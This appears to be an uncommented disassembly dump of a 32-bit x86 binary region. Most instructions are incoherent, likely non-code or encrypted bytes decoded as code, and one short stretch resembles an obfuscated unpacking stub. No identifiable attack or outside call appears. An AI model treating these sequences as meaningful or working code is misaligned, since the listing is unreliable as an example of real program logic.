  408148:	enter  0x2289,0xf3
  40814c:	and    al,0x9a
  40814e:	ja     0x4b1b3af7
  408154:	xchg   DWORD PTR [ecx],ecx
  408156:	test   al,0xb7
  408158:	xor    BYTE PTR [eax-0x15],bh
  40815b:	call   0x7a246c80
  408160:	jae    0x40818a
  408162:	out    dx,eax
  408163:	mov    al,0x81
  408165:	mov    cl,0x56
  408167:	or     DWORD PTR [ecx-0x65],ecx
  40816a:	aaa    
  40816b:	fwait
  40816c:	and    BYTE PTR [esi+edx*1-0x31cadece],dl
  408173:	lahf   
  408174:	lds    esi,FWORD PTR [ecx-0x26392257]
  40817a:	add    eax,DWORD PTR [edi-0x76]
  40817d:	outs   dx,DWORD PTR ds:[esi]
  40817e:	add    dh,BYTE PTR [ebp+0x40]
  408181:	inc    ebp
  408182:	pop    ds
  408183:	dec    eax
  408184:	and    bh,BYTE PTR [ecx+0x7197f610]
  40818a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40818b:	mov    esp,0xa6aad106
  408190:	jae    0x408130
  408192:	(bad)  
  408193:	push   ebx
  408194:	sub    al,0x30
  408196:	gs cmp eax,0x223d5a11
  40819c:	push   esp
  40819d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40819e:	or     BYTE PTR [ebx],ch
  4081a0:	xor    dl,BYTE PTR [esi-0x5d]
  4081a3:	scas   al,BYTE PTR es:[edi]
  4081a4:	fs fwait
  4081a6:	mov    ecx,0xaaf2ab00
  4081ab:	jmp    0xbe32:0x4bf0e053
  4081b2:	fstp   QWORD PTR [ebx+0x39]
  4081b5:	xor    edi,ebx
  4081b7:	mov    ecx,DWORD PTR [eax*1+0x5ddde807]
  4081be:	sti    
  4081bf:	pop    ebx
  4081c0:	jge    0x4081cb
  4081c2:	sub    DWORD PTR [esi-0x448ba489],esp
  4081c8:	das    
  4081c9:	or     DWORD PTR [esi-0x7bcb3794],0x1c7bda5f
  4081d3:	addr16 pop eax
  4081d5:	add    esi,edi
  4081d7:	lods   eax,DWORD PTR ds:[esi]
  4081d8:	out    0x75,al
  4081da:	pop    es
  4081db:	and    BYTE PTR [edi],bl
  4081dd:	popf   
  4081de:	and    BYTE PTR [edi-0x17c4d54e],bh
  4081e4:	add    DWORD PTR [eax+0x62],0xb4d7da40
  4081eb:	dec    esi
  4081ec:	in     al,dx
  4081ed:	add    al,BYTE PTR [esi+0x2ed51b06]
  4081f3:	add    BYTE PTR [esi],al
  4081f5:	dec    esp
  4081f6:	push   edi
  4081f7:	in     eax,0x40
  4081f9:	test   cl,0x79
  4081fc:	(bad)  
  4081fd:	mov    ah,0xef
  4081ff:	sbb    eax,0xef6e73ca
  408204:	xchg   edi,eax
  408205:	inc    edi
  408206:	push   0x561995c5
  40820b:	cmp    esi,ebx
  40820d:	jp     0x408238
  40820f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408210:	sub    eax,0x5c52d04b
  408215:	sub    eax,DWORD PTR [esi+0x3e]
  408218:	aas    
  408219:	mov    ebp,0xc891096f
  40821e:	arpl   bx,ax
  408220:	inc    BYTE PTR [eax]
  408222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408223:	dec    DWORD PTR [esi+0x103f98e1]
  408229:	sar    DWORD PTR [ebx+0x51],0xad
  40822d:	retf   0x83a9
  408230:	mov    ch,0x3a
  408232:	shr    DWORD PTR [ebp+0x4075858b],1
  408238:	arpl   WORD PTR [ebx+eiz*1+0x79],di
  40823c:	out    dx,eax
  40823d:	inc    edi
  40823e:	pop    edx
  40823f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408240:	mov    cl,BYTE PTR [esi]
  408242:	mov    edi,0x2871209d
  408247:	mov    ds:0x40ead85e,eax
  40824c:	push   ebx
  40824d:	repnz inc esi
  40824f:	pop    edi
  408250:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408251:	lods   eax,DWORD PTR ds:[esi]
  408252:	sub    eax,0xe504080e
  408257:	pop    ebx
  408258:	cmp    DWORD PTR [edx+esi*2+0x3d],eax
  40825c:	hlt    
  40825d:	addr16 mov ebx,0x862f1ab4
  408263:	adc    eax,0x20974de9
  408268:	jecxz  0x4082c3
  40826a:	mov    ch,0x9e
  40826c:	push   eax
  40826d:	push   ss
  40826e:	mov    dh,0xf1
  408270:	lahf   
  408271:	xor    esp,eax
  408273:	inc    edx
  408274:	popa   
  408275:	out    dx,eax
  408276:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408277:	not    BYTE PTR [eax]
  408279:	xchg   BYTE PTR [ecx-0x34],cl
  40827c:	adc    eax,0xe7cbe285
  408281:	mov    eax,0x3f3760c8
  408286:	jmp    0xd0b04c61
  40828b:	dec    esp
  40828c:	xor    bh,0xce
  40828f:	fiadd  WORD PTR [ecx]
  408291:	push   ebp
  408292:	fsubr  st(0),st
  408294:	ficomp DWORD PTR [edi-0x7159a76d]
  40829a:	or     bh,BYTE PTR [edi+ecx*2]
  40829d:	inc    esi
  40829e:	fisttp DWORD PTR [edx]
  4082a0:	jg     0x40825e
  4082a2:	dec    ecx
  4082a3:	cmp    esi,DWORD PTR [esi]
  4082a5:	aaa    
  4082a6:	aaa    
  4082a7:	inc    edx
  4082a8:	push   ecx
  4082a9:	mov    ah,0x58
  4082ab:	mov    ds:0xc72465a8,al
  4082b0:	stos   DWORD PTR es:[edi],eax
  4082b1:	xor    cl,bl
  4082b3:	adc    ch,bh
  4082b5:	fist   DWORD PTR [esi+eax*4+0x70]
  4082b9:	hlt    
  4082ba:	dec    esp
  4082bb:	ret    0xb77f
  4082be:	adc    al,0xbb
  4082c0:	push   0x1d78ac4e
  4082c5:	arpl   WORD PTR [edi+ebp*8+0x433ebf69],bp
  4082cc:	mov    ebp,?
  4082ce:	or     BYTE PTR cs:[ecx+0x49],dh
  4082d2:	out    dx,al
  4082d3:	add    BYTE PTR [ecx-0x21],cl
  4082d6:	mov    DWORD PTR [edi],esp
  4082d8:	jbe    0x408282
  4082da:	mov    ah,0x89
  4082dc:	and    esi,DWORD PTR [edx]
  4082de:	call   0x4d8f:0xb554d04
  4082e5:	pusha  
  4082e6:	push   eax
  4082e7:	stos   BYTE PTR es:[edi],al
  4082e8:	dec    edx
  4082e9:	mov    bl,0xd2
  4082eb:	test   WORD PTR [eax],di
  4082ee:	pop    ds
  4082ef:	stc    
  4082f0:	lahf   
  4082f1:	call   0xe351:0xd649bad9
  4082f8:	arpl   WORD PTR [ebp+ecx*2+0x8],dx
  4082fc:	jb     0x4082d7
  4082fe:	mov    ebx,DWORD PTR [edi+0x41a818e3]
  408304:	sub    ch,BYTE PTR [esi-0x78bc95ef]
  40830a:	mov    ebx,0x3d03e202
  40830f:	in     al,0x7
  408311:	or     esp,DWORD PTR [eax+0x40]
  408314:	push   esi
  408315:	retf   0x3b76
  408318:	mov    edi,0x1fa5d7fd
  40831d:	jns    0x4082d7
  40831f:	mov    dl,0x54
  408321:	imul   eax,ebx,0x2965f539
  408327:	mov    al,0x19
  408329:	(bad)  [eax+eiz*8]
  40832c:	xchg   edx,eax
  40832d:	push   0xfcdce9b8
  408332:	fild   WORD PTR [ebx]
  408334:	test   BYTE PTR [ecx+0x71c5a232],ah
  40833a:	cmp    BYTE PTR ds:0x9bb44fdf,dl
  408340:	inc    esp
  408341:	mov    ah,0xef
  408343:	das    
  408344:	fsubrp st(3),st
  408346:	scas   al,BYTE PTR es:[edi]
  408347:	scas   eax,DWORD PTR es:[edi]
  408348:	ins    BYTE PTR es:[edi],dx
  408349:	cmp    DWORD PTR [ebx+0x3f3f483f],ebp
  40834f:	test   DWORD PTR [edi],eax
  408351:	mov    bh,0x6d
  408353:	cld    
  408354:	push   ss
  408355:	sbb    bl,BYTE PTR [eax+eax*8+0x49]
  408359:	xor    eax,0x49434161
  40835e:	neg    DWORD PTR [ebp+0x21]
  408361:	loopne 0x40831f
  408363:	retf   
  408364:	repz jmp 0x4811:0x6c1f35b6
  40836c:	arpl   WORD PTR [ecx-0x17],dx
  40836f:	push   edx
  408370:	stc    
  408371:	int3   
  408372:	les    esp,FWORD PTR [eax+0x270d9f5a]
  408378:	retf   
  408379:	(bad)  
  40837a:	dec    esi
  40837b:	in     eax,0xb5
  40837d:	cmc    
  40837e:	pusha  
  40837f:	cmc    
  408380:	popf   
  408381:	pop    esp
  408382:	adc    DWORD PTR [esi+eiz*4+0x7],eax
  408386:	add    BYTE PTR [eax+0x7e],cl
  408389:	xchg   eax,eax
  40838b:	(bad)  
  40838c:	shl    BYTE PTR [edi],cl
  40838e:	out    0x18,eax
  408390:	inc    ebp
  408391:	inc    ebx
  408392:	aad    0xb7
  408394:	push   0xfffffffc
  408396:	repz mov WORD PTR ds:[edx+0x190b598c],fs
  40839e:	push   eax
  40839f:	jp     0x408336
  4083a1:	inc    DWORD PTR [ebp+0x2f30efc6]
  4083a7:	adc    BYTE PTR [eax-0x772e4573],dl
  4083ad:	inc    esp
  4083ae:	cmp    eax,0xed825f52
  4083b3:	in     eax,dx
  4083b4:	retf   0xaef2
  4083b7:	in     eax,dx
  4083b8:	pop    es
  4083b9:	mov    al,0xc
  4083bb:	outs   dx,BYTE PTR ds:[esi]
  4083bc:	dec    ecx
  4083bd:	push   esp
  4083be:	(bad)  
  4083bf:	aad    0x57
  4083c1:	sub    BYTE PTR [esi],dl
  4083c3:	sar    DWORD PTR [eax+0x79],cl
  4083c6:	pop    ecx
  4083c7:	jmp    0x850b8f07
  4083cc:	mov    al,ds:0x10b716a7
  4083d1:	mov    eax,0xde079e75
  4083d6:	cld    
  4083d7:	pop    ecx
  4083d8:	out    0xc7,eax
  4083da:	ins    BYTE PTR es:[edi],dx
  4083db:	mov    ah,0x39
  4083dd:	aam    0xbd
  4083df:	arpl   WORD PTR [ebp+esi*8+0x36],ax
  4083e3:	xchg   ecx,eax
  4083e4:	aad    0x19
  4083e6:	fwait
  4083e7:	cmp    edi,DWORD PTR [ebx+0x2684f00b]
  4083ed:	xchg   esp,eax
  4083ee:	js     0x4083bd
  4083f0:	xor    al,0x83
  4083f2:	pop    ecx
  4083f3:	pop    ebx
  4083f4:	shl    DWORD PTR [ecx+eax*1+0x79],cl
  4083f8:	mov    BYTE PTR [ecx-0x16],0xd4
  4083fc:	lds    edx,FWORD PTR [edi+edx*4-0x236133ad]
  408403:	mov    al,BYTE PTR [ebx]
  408405:	in     al,0x3f
  408407:	push   0xf987cbd3
  40840c:	jno    0x4083f9
  40840e:	add    edi,ebx
  408410:	fs mov dl,0xe6
  408413:	mov    bh,0xa5
  408415:	inc    edx
  408416:	adc    edx,DWORD PTR [edi-0x7259f80d]
  40841c:	nop
  40841d:	jno    0x408482
  40841f:	xchg   al,bl
  408421:	or     dh,BYTE PTR [ecx+0x1]
  408424:	into   
  408425:	or     al,0xc4
  408427:	out    dx,eax
  408428:	add    al,0x9
  40842a:	mov    ah,0x8c
  40842c:	inc    edx
  40842d:	sbb    ah,dl
  40842f:	jne    0x408428
  408431:	mov    WORD PTR [esi],ds
  408433:	fnstenv [ebx+0x37]
  408436:	push   esp
  408437:	xchg   BYTE PTR [edx],ah
  408439:	adc    edx,DWORD PTR [edx+0x1b]
  40843c:	imul   eax,edx,0xffffffec
  40843f:	inc    esi
  408440:	push   cs
  408441:	mov    BYTE PTR [esi],dl
  408443:	icebp  
  408444:	inc    ebx
  408445:	adc    al,0xfd
  408447:	test   al,0xe9
  408449:	or     eax,0xe2d7f514
  40844e:	dec    eax
  40844f:	cmp    ch,BYTE PTR [ebp+0x11]
  408452:	mov    fs,edi
  408454:	ret    0x4b1b
  408457:	out    0x75,eax
  408459:	push   edi
  40845a:	push   es
  40845b:	mov    eax,ds:0xb626df48
  408460:	fadd   QWORD PTR [ebx-0x7b]
  408463:	clc    
  408464:	dec    edx
  408465:	pop    eax
  408466:	popf   
  408467:	xchg   esp,eax
  408468:	xchg   edi,eax
  408469:	rol    DWORD PTR [edi],0xe6
  40846c:	loope  0x40845b
  40846e:	aad    0x1e
  408470:	xor    dh,BYTE PTR [eax-0x11]
  408473:	mov    dl,0x9a
  408475:	outs   dx,DWORD PTR ds:[esi]
  408476:	mov    esp,0x295b563e
  40847b:	dec    ebp
  40847c:	jno    0x408430
  40847e:	shl    BYTE PTR [edx+0xc],1
  408481:	and    al,0x7a
  408483:	dec    ebp
  408484:	ret    0x5104
  408487:	sub    eax,0x803cbe5f
  40848c:	repnz sbb eax,0xa31be57f
  408492:	adc    esi,0x10
  408495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408496:	xchg   ecx,eax
  408497:	stos   BYTE PTR es:[edi],al
  408498:	inc    edi
  408499:	mov    edx,DWORD PTR [ecx+0x46d331eb]
  40849f:	fcmovb st,st(4)
  4084a1:	xor    DWORD PTR [eax],ebx
  4084a3:	pop    es
  4084a4:	jmp    0x8269:0x3eefda22
  4084ab:	lahf   
  4084ac:	rcr    BYTE PTR [edi],cl
  4084ae:	lods   al,BYTE PTR ds:[esi]
  4084af:	out    dx,al
  4084b0:	mov    al,ds:0xd22019e0
  4084b5:	stc    
  4084b6:	sbb    DWORD PTR [esi],edi
  4084b8:	test   al,0x62
  4084ba:	scas   al,BYTE PTR es:[edi]
  4084bb:	jle    0x408458
  4084bd:	sub    BYTE PTR [esi-0x1d],bh
  4084c0:	mov    WORD PTR [esp],cs
  4084c3:	xchg   ah,ah
  4084c5:	cmc    
  4084c6:	sbb    edx,esp
  4084c8:	jmp    0x408451
  4084ca:	sub    bl,BYTE PTR [ebx+0x5]
  4084cd:	add    dl,BYTE PTR [esi-0x23f57402]
  4084d3:	(bad)  
  4084d4:	dec    esp
  4084d5:	mov    esp,0x9e0397b0
  4084da:	fstp   DWORD PTR [edx]
  4084dc:	pusha  
  4084dd:	mov    esi,es
  4084df:	mov    esp,DWORD PTR [edx]
  4084e1:	jg     0x4084a2
  4084e3:	scas   al,BYTE PTR es:[edi]
  4084e4:	xor    BYTE PTR [ecx+eiz*2],cl
  4084e7:	mov    ch,0xa9
  4084e9:	dec    esp
  4084ea:	inc    edi
  4084eb:	icebp  
  4084ec:	repz or bl,dh
  4084ef:	adc    al,0xe2
  4084f1:	xor    DWORD PTR [edx-0xe],edx
  4084f4:	out    0x7b,eax
  4084f6:	retf   
  4084f7:	mov    ecx,0x78e280cd
  4084fc:	sbb    dl,dh
  4084fe:	sbb    eax,0xd95eb59e
  408503:	mov    dl,0x91
  408505:	sti    
  408506:	xchg   esp,eax
  408507:	push   eax
  408508:	push   ecx
  408509:	pusha  
  40850a:	fs inc esp
  40850c:	sub    al,0x56
  40850e:	jmp    0x408589
  408510:	mov    ah,0xf8
  408512:	dec    eax
  408513:	cld    
  408514:	bound  esp,QWORD PTR [esp+edx*1+0x51]
  408518:	popf   
  408519:	xor    DWORD PTR [esi+0x63bcd37e],esp
  40851f:	add    al,0x8d
  408521:	pop    eax
  408522:	push   0x9177b69
  408527:	loopne 0x408512
  408529:	pop    edx
  40852a:	push   edi
  40852b:	xor    al,0x80
  40852e:	sub    bl,BYTE PTR [ecx+0xa]
  408531:	jne    0x40856f
  408533:	cmp    eax,0xa3d6c30d
  408538:	inc    edx
  408539:	jl     0x408577
  40853b:	pop    eax
  40853c:	and    eax,0x961c2b7e
  408541:	shl    DWORD PTR [edx-0x1c56d94],0xa8
  408548:	sub    al,0x37
  40854a:	loope  0x40855d
  40854c:	or     ah,BYTE PTR [esi]
  40854e:	sub    DWORD PTR [edi+0x7711d4a7],0xf6429c68
  408558:	or     eax,0xd6fd89fc
  40855d:	mov    esi,DWORD PTR [edi]
  40855f:	jb     0x4085c6
  408561:	call   0xa8e7:0xdbd5e5a9
  408568:	sub    DWORD PTR [ebx-0x2a0ca07e],esi
  40856e:	leave  
  40856f:	push   ds
  408570:	mov    al,ds:0x1348cbdc
  408575:	fcom   QWORD PTR [ecx+0x13]
  408578:	push   cs
  408579:	cmp    ecx,DWORD PTR [ebp-0x9]
  40857c:	aaa    
  40857d:	out    0x4e,al
  40857f:	(bad)  
  408580:	sar    ecx,cl
  408582:	ins    DWORD PTR es:[edi],dx
  408583:	and    eax,0x78a75102
  408588:	mov    ebx,ss
  40858a:	out    dx,al
  40858b:	xor    al,0xcb
  40858d:	into   
  40858e:	outs   dx,DWORD PTR ds:[esi]
  40858f:	out    0x19,eax
  408591:	xchg   DWORD PTR [edx+0x6],edi
  408594:	daa    
  408595:	test   eax,0x4fe9dc96
  40859a:	fcomi  st,st(4)
  40859c:	pop    ecx
  40859d:	inc    esp
  40859e:	and    DWORD PTR cs:[edi+ebx*8],eax
  4085a2:	hlt    
  4085a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085a4:	sub    eax,0xec4cf295
  4085a9:	pop    esi
  4085aa:	dec    ecx
  4085ab:	sar    bh,cl
  4085ad:	xlat   BYTE PTR ds:[ebx]
  4085ae:	lds    edx,FWORD PTR [ecx-0x61]
  4085b1:	cmp    al,0x74
  4085b3:	push   eax
  4085b4:	pusha  
  4085b5:	add    cl,ah
  4085b7:	aam    0x32
  4085b9:	ror    DWORD PTR [eax],1
  4085bb:	aad    0xd2
  4085bd:	jecxz  0x408562
  4085bf:	cmp    cl,dh
  4085c1:	pop    es
  4085c2:	out    dx,al
  4085c3:	push   0xecac867f
  4085c8:	cmp    eax,0xb5667104
  4085cd:	xor    cl,BYTE PTR [edx-0x56a29e25]
  4085d3:	pop    ss
  4085d4:	xchg   al,ch
  4085d6:	fcom   DWORD PTR [edx-0x328b3c07]
  4085dc:	xchg   edi,eax
  4085dd:	inc    edx
  4085de:	aaa    
  4085df:	inc    esp
  4085e0:	xor    ah,BYTE PTR [ebx-0x46]
  4085e3:	cmp    eax,0x18a4034c
  4085e8:	mov    esp,0xa2c5508e
  4085ed:	ja     0x4085b7
  4085ef:	xlat   BYTE PTR ds:[ebx]
  4085f0:	mov    ch,BYTE PTR [esi-0x77dbe1da]
  4085f6:	dec    ecx
  4085f7:	out    0x38,eax
  4085f9:	cli    
  4085fa:	xor    BYTE PTR [edi+0xb564b87],cl
  408600:	leave  
  408601:	cmp    BYTE PTR [ebx-0x47651edc],ch
  408607:	and    edi,esp
  408609:	loop   0x408604
  40860b:	pop    esp
  40860c:	lds    edx,FWORD PTR [edx]
  40860e:	jge    0x4085fe
  408610:	sub    eax,0xff342e56
  408615:	shr    DWORD PTR [ebx+0xde28b84],0x93
  40861c:	stos   BYTE PTR es:[edi],al
  40861d:	mov    al,ds:0x5cf187f2
  408622:	sub    eax,edi
  408624:	pop    es
  408625:	mov    esp,0x442145db
  40862a:	jmp    0x408645
  40862c:	rol    BYTE PTR fs:[esi+0x28515612],0x6d
  408634:	test   BYTE PTR [ecx+0x5c111c2c],ah
  40863a:	lahf   
  40863b:	nop
  40863c:	inc    esi
  40863d:	int    0xa1
  40863f:	sbb    DWORD PTR ds:0x45c46b00,0x65
  408646:	or     bl,bl
  408648:	fnstsw WORD PTR [ebp+0x75]
  40864b:	in     eax,0xfd
  40864d:	xor    ah,cl
  40864f:	push   edi
  408650:	je     0x408627
  408652:	jo     0x4085da
  408654:	lea    edx,[edx-0x6ac9d68a]
  40865a:	outs   dx,BYTE PTR ds:[esi]
  40865b:	scas   eax,DWORD PTR es:[edi]
  40865c:	push   ebx
  40865d:	fild   QWORD PTR ds:0x55377957
  408663:	rol    DWORD PTR [edi],1
  408665:	aam    0xa7
  408667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408668:	repnz cmp ch,ch
  40866b:	sub    esi,ebp
  40866d:	ficomp WORD PTR [ebp+eiz*4+0x7a6ed6fe]
  408674:	and    BYTE PTR [eax-0x2c9aa7fe],0xb8
  40867b:	push   ecx
  40867c:	clc    
  40867d:	shr    ah,cl
  40867f:	push   ebx
  408680:	pop    ss
  408681:	jge    0x408640
  408683:	push   cs
  408684:	or     esi,eax
  408686:	sbb    al,0x8b
  408688:	adc    al,0x56
  40868a:	or     dh,bh
  40868c:	test   ch,bh
  40868e:	xchg   BYTE PTR [ecx-0x2804c2be],bl
  408694:	lea    edi,[edx]
  408696:	(bad)  
  408697:	jno    0x40868f
  408699:	ins    BYTE PTR es:[edi],dx
  40869a:	out    dx,eax
  40869b:	(bad)  
  40869c:	int3   
  40869d:	mov    eax,ds:0xaf7ac403
  4086a2:	(bad)  
  4086a4:	and    al,BYTE PTR [ebx]
  4086a6:	int3   
  4086a7:	imul   ebx,esp,0xffffffb2
  4086aa:	sbb    ebp,DWORD PTR [ebx+eax*4-0x72]
  4086ae:	mov    eax,0x517dc45c
  4086b3:	imul   ebx,DWORD PTR [ebp+0x5e],0x28e5c3d8
  4086ba:	mov    edi,ds
  4086bc:	retf   
  4086bd:	jmp    0x36e1:0xd26d5427
  4086c4:	push   eax
  4086c5:	or     esi,DWORD PTR [ebp+ebp*8-0x8e9a160]
  4086cc:	xor    BYTE PTR [edi],cl
  4086ce:	repnz imul eax,DWORD PTR gs:[eax],0x2c92cafe
  4086d6:	out    0x82,al
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xe54f0f2c
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	(bad)  
  40871e:	xlat   BYTE PTR ds:[ebx]
  40871f:	inc    edi
  408720:	repz aaa 
  408722:	inc    esi
  408723:	dec    edx
  408724:	pminub mm6,QWORD PTR [edx-0x3]
  408728:	add    BYTE PTR [edi],al
  40872a:	mov    dl,dh
  40872c:	mov    eax,0x9e46face
  408731:	test   DWORD PTR [esi-0x3668881a],esi
  408737:	ret    
  408738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408739:	push   eax
  40873a:	sub    al,0x87
  40873c:	pusha  
  40873d:	dec    esp
  40873e:	fsubrp st(0),st
  408740:	mov    al,ds:0x2e5de518
  408745:	xchg   ecx,eax
  408746:	xor    ecx,DWORD PTR [ebx]
  408748:	jo     0x40877e
  40874a:	(bad)  
  40874b:	fisttp QWORD PTR [edx+0x3fd54b11]
  408751:	sbb    eax,0x59e8001b
  408756:	in     eax,0x5f
  408758:	(bad)  
  408759:	pushf  
  40875a:	pushf  
  40875b:	push   ds
  40875c:	and    al,0x54
  40875e:	mov    dh,0xcc
  408760:	dec    ebx
  408761:	pop    eax
  408762:	in     eax,dx
  408763:	inc    esi
  408764:	out    0x2b,eax
  408766:	lods   eax,DWORD PTR ds:[esi]
  408767:	cmp    BYTE PTR [edi+0x5],bl
  40876a:	sub    BYTE PTR [edi-0x2f46b941],bh
  408770:	(bad)  
  408771:	sahf   
  408772:	fdivr  st(1),st
  408774:	pop    edx
  408775:	mov    ebp,0x68c98a7a
  40877a:	imul   eax,DWORD PTR [ebx+edi*4+0x50],0xd822e00c
  408782:	mov    edx,0x6abc9525
  408787:	pop    ds
  408788:	js     0x408794
  40878a:	mov    ebx,0xcd360399
  40878f:	mov    edi,0xe5b5c734
  408794:	inc    ebp
  408795:	push   ebp
  408796:	fldenv [edi-0x33]
  408799:	inc    eax
  40879a:	mov    dl,0x6e
  40879c:	sbb    DWORD PTR [ebp-0x2c],0x5
  4087a0:	aas    
  4087a1:	xor    dl,ah
  4087a3:	xor    eax,0x14251610
  4087a8:	repnz inc edx
  4087aa:	imul   edi,DWORD PTR ds:0xe680d214,0x349f3271
  4087b4:	mov    eax,ds:0x85fddd34
  4087b9:	dec    esi
  4087ba:	sub    BYTE PTR [ebp-0x4b],0xe7
  4087be:	cld    
  4087bf:	xchg   edi,eax
  4087c0:	loopne 0x4087f3
  4087c2:	xchg   ecx,eax
  4087c3:	mov    eax,ds:0x7bc9dd06
  4087c8:	test   al,0x45
  4087ca:	adc    edi,DWORD PTR [edx-0x3c]
  4087cd:	mov    dl,0x89
  4087cf:	sahf   
  4087d0:	push   ss
  4087d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087d2:	cmc    
  4087d3:	pop    edx
  4087d4:	sub    DWORD PTR fs:[ecx+ecx*4+0x74b32825],0xb3959909
  4087e0:	adc    eax,0x9845a3c7
  4087e5:	sub    bl,dh
  4087e7:	xor    edi,ecx
  4087e9:	jle    0x4087c3
  4087eb:	inc    esi
  4087ec:	mov    dl,0x88
  4087ee:	mov    ebx,0x528a17b6
  4087f3:	xchg   ebx,eax
  4087f4:	js     0x4087a6
  4087f6:	adc    eax,0x70312013
  4087fb:	mov    bh,0x56
  4087fd:	and    DWORD PTR ds:0xe98d3ee3,esp
  408803:	sar    DWORD PTR [ebx-0x2aeb8428],0x1
  40880a:	push   ebx
  40880b:	cmp    DWORD PTR [ebx+0x5f364ad5],ebx
  408811:	inc    edx
  408812:	xchg   esi,eax
  408813:	jmp    0x798d69e0
  408818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408819:	pop    edx
  40881a:	xchg   esi,eax
  40881b:	loope  0x4087b1
  40881d:	lods   al,BYTE PTR ds:[esi]
  40881e:	nop
  40881f:	pop    ebp
  408820:	and    al,0x6c
  408822:	(bad)  
  408823:	rcr    DWORD PTR [ecx-0xd9583b8],cl
  408829:	mov    ecx,0xb6ce2e5d
  40882e:	cs nop
  408830:	arpl   WORD PTR [edi+0x6f],bp
  408833:	pop    ss
  408834:	loop   0x4087f0
  408836:	sub    al,cl
  408838:	mov    al,0xa0
  40883a:	push   edi
  40883b:	and    eax,0x30cf4db1
  408840:	adc    bl,BYTE PTR [ecx+eax*8-0x239c6069]
  408847:	push   esp
  408848:	add    cl,BYTE PTR [eax]
  40884a:	cmp    BYTE PTR [ebx],al
  40884c:	mov    bh,0xfe
  40884e:	test   DWORD PTR [eax],0x812e73bf
  408854:	dec    edi
  408855:	mov    bl,0xa0
  408857:	nop
  408858:	jecxz  0x4087f7
  40885a:	inc    edi
  40885b:	adc    eax,0xf19968
  408860:	pop    es
  408861:	jnp    0x408873
  408863:	jmp    0xc096:0x12dfa
  40886a:	sub    DWORD PTR [esi+0x19],edi
  40886d:	lea    esp,[bx+si]
  408870:	mov    cl,BYTE PTR [ebp-0x411e3ed8]
  408876:	nop
  408877:	xchg   DWORD PTR [edi],esp
  408879:	repnz sub ebp,0x20
  40887d:	in     eax,0x67
  40887f:	xchg   esi,eax
  408880:	imul   esp,DWORD PTR [ebx-0xc2d2a7e],0xffffff8f
  408887:	call   0xdc31:0x8a2bc045
  40888e:	retf   0x801c
  408891:	xchg   esi,eax
  408892:	mov    dl,0x18
  408894:	mov    ebx,0xcc8041c4
  408899:	mov    dl,bl
  40889b:	sbb    bh,BYTE PTR [eax-0x6c]
  40889e:	jo     0x4088e2
  4088a0:	lock push cs
  4088a2:	out    dx,al
  4088a3:	cmp    DWORD PTR [edi-0xa],0x91d40f2a
  4088aa:	sbb    ecx,DWORD PTR [ebx+0x202751dd]
  4088b0:	mov    edx,ebp
  4088b2:	push   ss
  4088b3:	daa    
  4088b4:	in     al,0xf7
  4088b6:	sbb    DWORD PTR [ebx],ecx
  4088b8:	cli    
  4088b9:	pushf  
  4088ba:	pop    ebx
  4088bb:	and    ch,BYTE PTR [ecx-0x2af3424d]
  4088c1:	push   ds
  4088c2:	fxch   st(2)
  4088c4:	popa   
  4088c5:	sub    eax,0x16d46374
  4088ca:	mov    edx,0xb60a8284
  4088cf:	inc    ecx
  4088d0:	inc    eax
  4088d1:	jmp    0x5b05:0x2d486b09
  4088d8:	and    BYTE PTR [esi-0x80],bh
  4088db:	sbb    ch,al
  4088dd:	jo     0x40886c
  4088df:	cmp    BYTE PTR [edi-0x35],0xfb
  4088e3:	mov    WORD PTR [ebp+0x447f4670],?
  4088e9:	lods   eax,DWORD PTR ds:[esi]
  4088ea:	ss jle 0x408886
  4088ed:	data16 add al,0x7a
  4088f0:	repz ffree st(1)
  4088f3:	jno    0x4088a9
  4088f5:	cmp    al,0x29
  4088f7:	mov    ch,0xd2
  4088f9:	xchg   BYTE PTR ds:0xbff301af,dl
  4088ff:	mov    dl,0x94
  408901:	inc    ebx
  408902:	mov    esp,DWORD PTR [eax+0x663eb277]
  408908:	out    0x35,eax
  40890a:	pop    edi
  40890b:	icebp  
  40890c:	xor    dh,BYTE PTR [esi-0x37]
  40890f:	mov    eax,ds:0x5bec642b
  408914:	and    dh,BYTE PTR [ebx+0x5a743f9b]
  40891a:	and    esp,esp
  40891c:	xlat   BYTE PTR ds:[ebx]
  40891d:	jle    0x408919
  40891f:	test   DWORD PTR ds:0x4745da15,edx
  408925:	dec    ebp
  408926:	ins    DWORD PTR es:[edi],dx
  408927:	mov    dh,0x7a
  408929:	or     eax,esp
  40892b:	js     0x40891e
  40892d:	or     al,dl
  40892f:	hlt    
  408930:	nop
  408931:	push   ecx
  408932:	and    eax,0x18db1146
  408937:	dec    eax
  408938:	or     cl,ch
  40893a:	pop    edi
  40893b:	xor    al,0x38
